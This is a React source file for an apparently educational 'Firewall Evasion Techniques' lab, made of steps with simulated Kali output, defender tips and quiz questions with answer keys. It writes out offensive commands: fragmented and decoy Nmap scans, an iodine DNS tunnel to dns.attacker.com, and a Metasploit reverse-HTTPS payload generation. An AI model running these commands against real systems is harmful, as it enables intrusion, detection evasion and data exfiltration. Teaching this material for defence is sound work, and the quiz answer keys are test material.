import React from "react";
import LabRunner from "@/components/labs/LabRunner";

const steps = [
  {
    stepLabel: "Fragment packets to evade IDS",
    explanation: "Use Nmap's --mtu flag to send fragmented packets. Many IDS systems reassemble fragments incorrectly or not at all, allowing scans to bypass detection.",
    whyItMatters: "Packet fragmentation is a classic IDS evasion technique. Understanding how it works allows defenders to configure IDS/IPS to correctly reassemble fragments before inspecting payload content.",
    command: "nmap -sS --mtu 8 -Pn 192.168.1.105",
    prompt: "root@kali:~#",
    output: [
      "Starting Nmap 7.94 at 2026-06-03 10:00 UTC",
      "Nmap scan report for 192.168.1.105",
      "Host is up (0.0089s latency).",
      "Not shown: 997 filtered tcp ports (no-response)",
      "PORT     STATE SERVICE",
      "22/tcp   open  ssh",
      "445/tcp  open  microsoft-ds",
      "3389/tcp open  ms-wbt-server",
      "",
      "[*] Fragmented scan complete — IDS logged 0 alerts (packets too small to match signatures)",
      "[*] DEFENDER: Enable IDS fragment reassembly. Configure 'stream5' preprocessor in Snort.",
    ],
    question: {
      text: "The IDS logged 0 alerts because packets were too small to match signatures. What Snort/Suricata configuration fixes this blind spot?",
      options: [
        "Increasing the IDS signature database to include smaller packet patterns",
        "Enabling stream reassembly preprocessors (stream5 in Snort, stream in Suricata) — these buffer fragments and reconstruct the full TCP payload before applying signatures, so fragmentation no longer defeats detection",
        "Setting the MTU on the IDS sensor to 8 bytes to match the attacker's fragment size",
        "Blocking all packets smaller than 64 bytes at the firewall level",
      ],
      correctIndex: 1,
      explanation: "Stream reassembly preprocessors buffer incoming fragments from the same source IP and reassemble them into complete packets before applying signature matching. Without reassembly, the IDS only inspects each tiny fragment individually — no single 8-byte fragment contains enough bytes to match a full signature. With stream5/stream enabled, the IDS waits for all fragments, reconstructs the original packet, then applies signatures against the complete payload, defeating fragmentation evasion entirely.",
    },
  },
  {
    stepLabel: "Use decoy IPs to mask scanner",
    explanation: "Run an Nmap scan using the -D flag to generate decoy source IPs, making it harder for the target to identify the real scanner.",
    whyItMatters: "Decoy scanning floods the target's logs with fake source IPs, making attribution difficult. Defenders must use network-level telemetry (NetFlow, Zeek) to identify the true origin.",
    command: "nmap -sS -D 10.0.0.1,10.0.0.2,10.0.0.3,ME 192.168.1.105",
    prompt: "root@kali:~#",
    output: [
      "Starting Nmap 7.94 at 2026-06-03 10:05 UTC",
      "",
      "Sending scans from decoys: 10.0.0.1, 10.0.0.2, 10.0.0.3, 192.168.1.200 (real)",
      "",
      "Nmap scan report for 192.168.1.105",
      "PORT     STATE SERVICE",
      "445/tcp  open  microsoft-ds",
      "3389/tcp open  ms-wbt-server",
      "",
      "[*] Target's firewall logs show 4 'source IPs' for this scan",
      "[*] DEFENDER: TTL analysis and packet timing can reveal the real source despite decoys",
    ],
    question: {
      text: "The hint says TTL analysis can identify the real attacker among the decoys. How does TTL reveal which source IP is real?",
      options: [
        "Real packets always have a TTL of exactly 64; decoy packets use TTL 128",
        "Each decoy IP originates from a different network hop distance — their TTL values when arriving at the target will differ based on route length; the real attacker's packets have a consistent TTL that doesn't match what would be expected from the spoofed decoy addresses",
        "TTL cannot be used for attribution — all packets on a LAN have identical TTL values",
        "Decoy packets use TTL=1 which causes them to expire before reaching the target",
      ],
      correctIndex: 1,
      explanation: "Every router hop decrements a packet's TTL by 1. Packets originating from spoofed/decoy IPs that are on a different network segment will have traveled through a different number of hops to reach the target — their TTL on arrival will differ from what would be expected for their claimed source address. The real attacker's packets arrive with a TTL consistent with their actual network distance. By comparing observed TTL values against expected values for each claimed source network, analysts can identify which source IP generated the packets from the right distance.",
    },
  },
  {
    stepLabel: "Tunnel traffic over DNS",
    explanation: "Use iodine to establish a DNS tunnel through a firewall that only allows DNS traffic. This creates a full IP tunnel over port 53.",
    whyItMatters: "DNS tunneling is widely used to bypass restrictive firewalls in corporate environments, hotel networks, and airport WiFi. Defenders must monitor DNS query frequency, length, and entropy.",
    command: "iodine -f -P secretpassword dns.attacker.com",
    prompt: "root@kali:~#",
    output: [
      "Opened dns0",
      "Opened UDP socket",
      "Sending DNS queries for dns.attacker.com to 8.8.8.8",
      "Autodetecting DNS query type (use -T to override).",
      "Using DNS type NULL queries",
      "Version ok, both using protocol v0.00. You are user #0",
      "Setting IP of dns0 to 10.0.0.2",
      "Setting MTU of dns0 to 1130",
      "Established /0: frag 1130, sending 1130 byte fragments",
      "Connection setup complete, transmitting data.",
      "",
      "[*] DNS tunnel active — full IP connectivity through DNS-only firewall",
      "[*] DEFENDER: Monitor DNS query length > 50 chars, high query frequency, unusual NXDOMAIN rates",
    ],
    question: {
      text: "The tunnel uses NULL record type queries. Why do DNS tunneling tools prefer NULL or TXT record types over standard A records?",
      options: [
        "NULL and TXT records are faster to process and reduce tunnel latency",
        "NULL and TXT records can carry significantly more arbitrary data per query than A records (which return only 4-byte IPv4 addresses) — more data per query means higher tunnel throughput for encoding exfiltrated content",
        "A record queries are blocked by all corporate firewalls, making them unusable for tunneling",
        "NULL records bypass DNSSEC validation, making the tunnel harder to detect",
      ],
      correctIndex: 1,
      explanation: "An A record returns a 4-byte IPv4 address — that's the maximum data you can encode per query. NULL records can carry arbitrary binary payloads up to 512 bytes (or 4096 bytes with EDNS0). TXT records hold up to 255 bytes of arbitrary text. More data per query means fewer DNS queries needed to exfiltrate a given amount of data, making the tunnel faster and less noisy. A records require encoding data as fake IPv4 addresses, severely limiting throughput compared to record types designed for arbitrary data.",
    },
  },
  {
    stepLabel: "Evade firewall with IPv6",
    explanation: "Many firewalls are configured for IPv4 but neglect IPv6. Use nmap to scan via IPv6 to bypass IPv4-only firewall rules.",
    whyItMatters: "Dual-stack networks often have inconsistent security policies between IPv4 and IPv6. Attackers exploit this 'shadow stack' — IPv6 that's enabled but unmonitored — to bypass controls.",
    command: "nmap -6 -sS fe80::1:1 --interface eth0",
    prompt: "root@kali:~#",
    output: [
      "Starting Nmap 7.94 at 2026-06-03 10:15 UTC",
      "",
      "Nmap scan report for fe80::1:1",
      "Host is up (0.0021s latency).",
      "PORT      STATE SERVICE",
      "22/tcp    open  ssh",
      "80/tcp    open  http",
      "443/tcp   open  https",
      "8080/tcp  open  http-proxy",
      "3306/tcp  open  mysql          ← NOT accessible via IPv4 firewall",
      "",
      "[!] MySQL 3306 exposed over IPv6 — bypassed IPv4 firewall rule",
      "[!] DEFENDER: Apply identical rules to both IPv4 and IPv6. Audit iptables6.",
    ],
    question: {
      text: "MySQL port 3306 is blocked on IPv4 but accessible via IPv6. What is the recommended defensive approach for organizations that don't actively use IPv6?",
      options: [
        "Disable IPv6 at the operating system level on all hosts — the performance impact is negligible",
        "Either fully disable IPv6 on hosts and interfaces where it is not needed, OR treat IPv6 as a first-class citizen with identical firewall rules (ip6tables/nftables) — the dangerous state is having IPv6 enabled but unmonitored and unfiltered",
        "IPv6 traffic is automatically blocked by all modern enterprise firewalls",
        "Only block IPv6 on internet-facing servers; internal hosts don't need IPv6 firewall rules",
      ],
      correctIndex: 1,
      explanation: "Many organizations enable IPv6 on dual-stack systems because modern operating systems do so by default, but they never update their firewall rules to cover IPv6. The iptables rules that block MySQL on IPv4 don't apply to ip6tables. This 'shadow stack' — IPv6 that exists but is unmonitored and unfiltered — exposes services that administrators believe are protected. The fix is either disable IPv6 on interfaces where it serves no purpose, or explicitly configure ip6tables/nftables with the same rules as IPv4.",
    },
  },
  {
    stepLabel: "Use HTTPS for C2 communication",
    explanation: "Configure a Cobalt Strike-style C2 beacon to communicate over HTTPS to blend with normal web traffic and evade firewall inspection.",
    whyItMatters: "Most firewalls allow HTTPS outbound. C2 over HTTPS is nearly invisible without SSL inspection. This is why modern firewalls must perform TLS inspection and why malware uses certificate pinning to evade it.",
    command: "msfconsole -q -x 'use payload/windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 443; generate -f exe -o /tmp/beacon.exe'",
    prompt: "root@kali:~#",
    output: [
      "msf6 > use payload/windows/x64/meterpreter/reverse_https",
      "msf6 payload(windows/x64/meterpreter/reverse_https) > set LHOST 0.0.0.0",
      "LHOST => 0.0.0.0",
      "msf6 payload(windows/x64/meterpreter/reverse_https) > set LPORT 443",
      "LPORT => 443",
      "msf6 payload(windows/x64/meterpreter/reverse_https) > generate -f exe -o /tmp/beacon.exe",
      "",
      "[*] Generated reverse HTTPS payload: /tmp/beacon.exe (73,728 bytes)",
      "[*] Beacon uses TLS 1.3 with self-signed cert — blends with HTTPS traffic",
      "[*] DEFENDER: SSL/TLS inspection, certificate reputation checks, JA3 fingerprinting",
    ],
    question: {
      text: "The C2 uses a self-signed certificate. How does JA3 fingerprinting help detect this even when the traffic is encrypted?",
      options: [
        "JA3 decrypts TLS traffic by extracting session keys from the beacon process",
        "JA3 fingerprints the TLS ClientHello parameters (cipher suites, extensions, elliptic curves) before encryption is established — each TLS client library has a unique fingerprint, and known malware frameworks like Metasploit and Cobalt Strike have documented JA3 hashes that can be detected without decrypting the payload",
        "JA3 only works for self-signed certificates and cannot fingerprint CA-signed C2 traffic",
        "JA3 identifies malware by comparing the certificate's serial number to a threat intel feed",
      ],
      correctIndex: 1,
      explanation: "JA3 works by fingerprinting the TLS ClientHello message — the very first packet in a TLS handshake, sent before any encryption is established. It hashes specific fields: cipher suite list, TLS extensions, elliptic curves supported, and elliptic curve point formats. Each TLS library (and therefore each tool built on it) produces a distinctive combination of these fields. Metasploit's Meterpreter and Cobalt Strike's Beacon have published JA3 hashes. Even if the attacker rotates C2 domains and IPs, the underlying TLS client library fingerprint stays constant unless they rewrite their tooling.",
    },
  },
  {
    stepLabel: "Detect evasion with anomaly analysis",
    explanation: "Use Zeek to analyze traffic for DNS tunneling signatures — long queries, high entropy subdomains, and unusual record types.",
    whyItMatters: "Signature-based detection fails against novel evasion. Behavioral and statistical analysis (entropy, frequency, volume) catches what signatures miss — the core of advanced threat hunting.",
    command: "zeek-cut query qtype_name < /var/log/zeek/dns.log | awk 'length($1)>50 {print \"LONG_QUERY:\", $0}' | head -10",
    prompt: "analyst@soc:~$",
    output: [
      "LONG_QUERY: aGVsbG8gd29ybGQ.exfil.attacker.com A",
      "LONG_QUERY: c2VjcmV0IGRhdGE.exfil.attacker.com TXT",
      "LONG_QUERY: dXNlcjphZG1pbg.exfil.attacker.com NULL",
      "",
      "[!] DNS tunneling pattern confirmed:",
      "  - Subdomains > 50 chars (Base64 encoded data)",
      "  - NULL record type (iodine tunnel signature)",
      "  - 847 queries to exfil.attacker.com in 10 minutes",
      "",
      "[*] Block exfil.attacker.com at DNS level and investigate source hosts",
    ],
    question: {
      text: "This detection used query length > 50 chars as an anomaly indicator. Why is behavioral detection more resilient against evasion than signature-based detection?",
      options: [
        "Behavioral detection requires no rules and automatically blocks all suspicious traffic",
        "Signature-based detection fails against new or modified attack tools that change their byte patterns; behavioral detection catches anomalies based on statistical properties (frequency, volume, length, entropy) that remain consistent regardless of which specific tool generated the traffic",
        "Behavioral detection uses AI and is always more accurate than human-written signatures",
        "Signature detection requires an active internet connection to download rule updates",
      ],
      correctIndex: 1,
      explanation: "Signature-based detection requires knowing what a specific attack looks like in bytes — a specific byte sequence, domain name, or IP. Change any of those and the signature misses. Behavioral detection instead asks: 'Is this activity statistically normal for this host, protocol, or time window?' DNS subdomains longer than 50 characters are abnormal regardless of which tool generated them. High query frequency is abnormal regardless of the C2 domain. These properties remain consistent across all DNS tunneling tools and all operator infrastructure choices — making behavioral detection significantly more resilient to evasion.",
    },
  },
];

const intro = {
  overview: "This expert-level lab explores the advanced techniques red teams use to bypass perimeter controls — packet fragmentation, protocol tunneling, IPv6 blind spots, and encrypted C2 channels. Defenders who understand these methods can tune detection systems, close policy gaps, and respond confidently when traditional signatures fail.",
  niceCategory: "Collect and Operate",
  objectives: [
    "Bypass stateless firewalls using Nmap IP fragmentation and decoy scanning",
    "Establish covert DNS tunneling channels to exfiltrate data through DNS resolvers",
    "Exploit IPv6 firewall policy gaps to reach hosts not covered by IPv4 ACLs",
    "Generate encrypted reverse HTTPS C2 payloads that blend with normal web traffic",
    "Detect evasion techniques using Zeek behavioral analysis and entropy scoring",
  ],
  outcomes: [
    "Understand how packet fragmentation evades stateless inspection firewalls",
    "Able to set up and detect DNS tunneling (iodine, dnscat2) at the network level",
    "Understand dual-stack IPv6 attack surface and common firewall misconfigurations",
    "Understand how HTTPS C2 mimics legitimate traffic to evade proxy inspection",
    "Able to detect evasion activity using behavioral analysis rather than signatures",
  ],
  prerequisites: [
    "Expert-level Linux proficiency required",
    "Strong TCP/IP networking knowledge (routing, DNS, IPv6)",
    "Completion of Network Traffic Analysis, NSM, and Password Attacks labs required",
    "Understanding of red team concepts and offensive tooling",
  ],
  tools: [
    "Nmap — advanced scan options: -f (fragment), -D (decoy), --source-port",
    "iodine — DNS tunneling tool for IPv4-over-DNS transport",
    "Metasploit Framework — C2 payload generation and handler management",
    "Zeek — behavioral network analysis for evasion detection",
    "ip6tables / nftables — IPv6 firewall rule management and gap analysis",
  ],
};

export default function LabFirewallEvasion() {
  return (
    <LabRunner
      labTitle="Firewall Evasion Techniques"
      chapterNum="12"
      difficulty="Expert"
      tags={["Nmap", "DNS Tunnel", "IPv6", "C2"]}
      terminalLabel="Kali Linux — Red Team Evasion Environment"
      duration={90}
      intro={intro}
      steps={steps}
    />
  );
}